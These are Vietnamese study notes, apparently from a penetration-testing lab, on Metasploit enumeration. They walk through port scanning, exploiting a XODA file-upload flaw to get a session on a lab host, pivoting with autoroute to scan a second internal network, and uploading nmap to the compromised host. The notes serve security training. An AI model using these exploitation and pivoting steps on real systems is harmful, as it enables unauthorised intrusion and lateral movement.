# Enumeration

## Import Nmap Result to MSF 

Để bắt đầu MSF:

`service postgresql start` -> khởi động cơ sở dữ liệu

`msfconsole` -> khởi động MSF

`db_status` -> kiểm tra kết nối db

`workspace -a <name>` -> tạo workspace mới với tên đặt

`db_import <path to xml>` -> import kết quả nmap, lưu dưới dạng xml

`db_nmap ...` -> chạy nmap trong MSF

## Auxiliary Modules

Dùng trong quá trình enum khi máy target 2 mà chỉ máy target 1 truy cập được, máy attacker chỉ truy cập được target 1, ko truy cập trực tiếp được target 2

Tức là `Auxiliary` có thể chạy enum vs các mạng liên kết vs target 1, điều mà `nmap` ko làm được 


sau khi vào MSF

đầu tiên, tìm kiếm module để quét

`search portscan` hay `search udp` để tìm kiếm module

`use auxiliary/scanner/portscan/tcp` -> dùng `use` + name module để vào chế độ sử dụng module đó

`show options` -> để xem các options cần thiết lập với module đó, cột `current` thể hiện giá trị đạng được gán

`set RHOSTS 192.86.140.3` -> set RHOST cho quá trình scan

`run` -> sau khi set các biến cần thiết thì type `run` để chạy module

TRONG TRƯỜNG HỢP NÀY TÌM THẤY PORT 80 MỞ

`curl 192.86.140.3` -> lấy được thông tin server chạy XODA 

`search xoda` -> để tìm kiếm module exploit service này 

kết quả ra 1 module: `exploit/unix/webapp/xoda_file_upload`

`use exploit/unix/webapp/xoda_file_upload` -> chuyển sang module exploit này

`show options`

`set RHOSTS 192.86.140.3`

`set TARGETURI /`

`set LHOST IP_may_attacker`

`exploit` -> để chạy exploit module này

chờ quá trình hoàn tất thì ta đã có thể chiếm quyền ở máy target 1

ở target 1:

`sysinfo` -> xem thông tin target

`shell`

`ip addr` -> lấy thông tin network đến target 2

ta thấy ở target 1 có 1 eth1 có ip `192.113.124.2` như vậy là dải ip nối với target 2

thoat shell `exit`

`run autoroute -s 192.113.124.2` -> ĐÂY LÀ BƯỚC KHÁC BIỆT VỚI `NMAP`, ở Nmap khi ko có kết nối với máy target2 thì ko scan được, nhưng trong MSF, sau khi khai thác được target 1, ta set route đến target 2 thì từ đây, đứng ở máy attacker vẫn scan được đến target 2

`background` -> trở về session 1, session mà ta chuẩn bị khai thác xoda, có thể xem có các session nào bằng lệnh `sessions`

`use auxiliary/scanner/portscan/tcp` -> vào module scan

`set RHOSTS 192.113.124.3` -> IP target 2

`run` -> scan được target 2

### Lab auxiliary modules

lab này gần như giống các bước trên, có thêm đoạn upload nmap vào máy target 1 để chạy nmap trên target 1 nhằm check lại 

các bước 

`sessions -i 1` vào session target 1 

`upload /root/static-binaries/nmap /tmp/nmap` upload nmap từ máy attacker lên target 1

`shell`

`cd /tmp/`

`chmod +x ./nmap`

`./nmap -p- 192.180.108.3` chạy nmap kiểm tra






























